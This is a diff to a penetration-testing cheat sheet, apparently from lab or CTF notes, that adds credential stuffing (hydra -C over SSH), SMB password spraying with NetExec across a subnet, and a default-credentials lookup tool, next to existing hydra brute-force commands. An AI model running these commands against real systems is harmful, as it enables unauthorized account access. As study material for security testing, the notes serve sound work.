@@ -209,3 +209,26 @@ sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.211.150 http-post-
 sudo hydra 10.0.0.1 http-post-form "/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid" -P /usr/share/wordlists/rockyou.txt -l admin
 hydra -l lazie -P /opt/rockyou.txt imap://10.10.251.142 -vV
 ```
+
+---
+
+### Credential Stuffing
+
+* Use `-C` with a colon-separated `user:pass` file instead of separate user and password lists
+
+```
+hydra -C user_pass.list ssh://10.100.38.23
+```
+
+### Password Spraying (SMB via NetExec)
+
+```
+netexec smb 10.100.38.0/24 -u usernames.list -p 'ChangeMe123!'
+```
+
+### Default Credentials Cheat Sheet
+
+```
+pip3 install defaultcreds-cheat-sheet
+creds search linksys
+```
